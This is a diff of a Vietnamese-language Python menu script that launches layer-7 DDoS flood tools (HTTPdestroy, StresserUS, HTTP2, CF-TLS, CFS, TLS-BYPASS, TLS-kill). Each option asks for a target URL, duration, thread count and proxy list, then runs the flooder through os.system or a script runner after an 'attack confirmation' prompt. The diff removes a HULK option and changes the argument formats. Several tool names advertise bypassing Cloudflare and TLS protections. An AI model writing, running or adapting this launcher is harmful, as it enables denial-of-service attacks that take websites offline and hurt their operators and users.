@@ -36,34 +36,20 @@ def show_menu():
     print()
     print("============= Method layer 7 ============")
     print("  ==> Golang")
-    print("  [1] - HULK")
-    print("  [2] - HTTPdestroy")
-    print("  [3] - StresserUS")
+    print("  [1] - HTTPdestroy")
+    print("  [2] - StresserUS")
     print("  ==> Nodejs")
-    print("  [4] - HTTP2")
-    print("  [5] - CF-TLS")
-    print("  [6] - CFS")
-    print("  [7] - TLS-BYPASS")
-    print("  [8] - TLS-kill")
+    print("  [3] - HTTP2")
+    print("  [4] - CF-TLS")
+    print("  [5] - CFS")
+    print("  [6] - TLS-BYPASS")
+    print("  [7] - TLS-kill")
     print("  [0] - Thoát")
     print("=========================================")
 
 # Xử lý lựa chọn script từ người dùng
 def handle_menu_selection(selection):
     if selection == '1':
-        print("\n================= HULK ==================")
-        target = input("  Nhập target: ")
-
-        os.system("cls" if os.name == "nt" else "clear")
-        print()
-        print("================= HULK ==================")
-        print(f"  Thông tin mục tiêu tấn công")
-        print(f"  Target: {target}")
-        print("=========================================")
-        input("  xác nhận attack (Enter)\n")
-        os.system(f"go run hulk.go -site target={target}")
-
-    elif selection == '2':
         print("\n============== HTTPdestroy ==============")
         target = input("  Nhập target: ")
         time = input("  Nhập time: ")
@@ -84,9 +70,9 @@ def handle_menu_selection(selection):
         os.system(f"chmod 777 httpdestroy")
         proxy_count = count_proxy(proxy_file)
         print(f"  Số proxy được tìm thấy: {proxy_count}")
-        os.system(f"./httpdestroy target={target} time={time} requests={requests} thread={thread} proxy_file={proxy_file}")
+        os.system(f"./httpdestroy {target} {time} {requests} {thread} {proxy_file}")
 
-    elif selection == '3':
+    elif selection == '2':
         print("\n=============== StresserUS ==============")
         target = input("  Nhập target: ")
         limit = input("  Nhập Rate limit: ")
@@ -109,10 +95,10 @@ def handle_menu_selection(selection):
         os.system(f"chmod +x StresserUS")
         proxy_count = count_proxy(proxy_file)
         print(f"  Số proxy được tìm thấy: {proxy_count}")
-        os.system(f"./StresserUS version=2 target={target} limit={limit} time={time} proxy_file={proxy_file} threads={thread} mode={mode}")
+        os.system(f"./StresserUS version=2 host={target} limit={limit} time={time} list={proxy_file} threads={thread} mode={mode}")
 #./StresserUS version=2 host=<url> limit=<rate> time=<time> list=<proxyfile> threads=<thread> mode=<GET/POST> cookie=<ddos=true> data=<post=true>
 
-    elif selection == '4':
+    elif selection == '3':
         print("\n================= HTTP2 =================")
         target = input("  Nhập target: ")
         time = input("  Nhập time: ")
@@ -133,7 +119,7 @@ def handle_menu_selection(selection):
         print(f"  Số proxy được tìm thấy: {proxy_count}")
         run_script('HTTP2.js', [target, time])
 
-    elif selection == '5':
+    elif selection == '4':
         print("\n================= CF-TLS ================")
         target = input("  Nhập target: ")
         time = input("  Nhập time: ")
@@ -153,7 +139,7 @@ def handle_menu_selection(selection):
         print(f"  Số proxy được tìm thấy: {proxy_count}")     
         run_script('CF-TLS.js', [target, time, thread, proxy_file])
 
-    elif selection == '6':
+    elif selection == '5':
         print("\n================== CFS ==================")
         target = input("  Nhập target: ")
         time = input("  Nhập time: ")
@@ -179,7 +165,7 @@ def handle_menu_selection(selection):
         print(f"  Chương trình được chỉnh sửa & biên dịch bởi Đậu Đậu\n")
         run_script('CFS.js', [target, time, thread, mode, proxy_file, requests])
 
-    elif selection == '7':
+    elif selection == '6':
         print("\n=============== TLS-BYPASS ==============")
         target = input("  Nhập target: ")
         time = input("  Nhập time: ")
@@ -203,7 +189,7 @@ def handle_menu_selection(selection):
         print(f"  Chương trình được chỉnh sửa & biên dịch bởi Đậu Đậu\n")
         run_script('TLS-BYPASS.js', [target, time, thread, proxy_file, requests])
 
-    elif selection == '8':
+    elif selection == '7':
         print("\n================ TLS-kill ===============")
         target = input("  Nhập target: ")
         thread = input("  Nhập thread: ")
@@ -239,12 +225,12 @@ def handle_menu_selection(selection):
 def start_panel():
     while True:
         show_menu()
-        selection = input("  Nhập lựa chọn của bạn (0-8): ")
+        selection = input("  Nhập lựa chọn của bạn (0-7): ")
         
         if selection == '0':
             break
         
-        if selection not in ['1', '2', '3', '4', '5', '6', '7', '8']:
+        if selection not in ['1', '2', '3', '4', '5', '6', '7']:
             print("  Lựa chọn không hợp lệ. Vui lòng chọn lại.")
             continue
         
